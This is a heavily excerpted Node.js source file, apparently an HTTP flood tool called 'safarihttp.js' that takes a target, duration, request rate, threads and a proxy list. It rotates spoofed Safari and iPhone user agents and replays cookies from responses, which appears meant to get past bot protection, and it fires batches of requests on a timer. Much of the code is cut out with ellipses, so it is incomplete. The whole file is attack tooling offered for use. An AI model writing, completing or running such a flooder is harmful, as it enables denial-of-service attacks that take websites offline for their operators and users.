...
if (process.argv.length < 7){
    console.log(`node safarihttp.js [target] [time] [rate] [thread] [proxy] --path`);
    process.exit();
}
...
const languages = [
    "en-US", "en-GB", "en", "de", "fr", "es", "pt-BR", "it", 
    "ru", "ja", "nl", "pl", "ko", "tr", "sv", "au"
];
...
const useragents = [
    ...
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    ...
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    ...
    "Mozilla/5.0 (iPad; CPU OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    ...
    "Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    ...
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
...
// Get stored cookies for host
function getCookiesForHost(host) {
    return cookieJar.get(host) || '';
}

// Store cookies for host
function storeCookiesForHost(host, cookies) {
    if (cookies) {
        const existing = cookieJar.get(host) || '';
        const merged = existing ? `${existing}; ${cookies}` : cookies;
...
function buildHeaders() {
    ...
    const cookies = getCookiesForHost(parsedTarget.host);
    if (cookies) {
            ...
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    request.on("response", (responseHeaders) => {
                        // Check for Set-Cookie header and store it
                        if (responseHeaders['set-cookie']) {
                            const cookies = parseCookies(responseHeaders['set-cookie']);
                            storeCookiesForHost(parsedTarget.host, cookies);
                        }
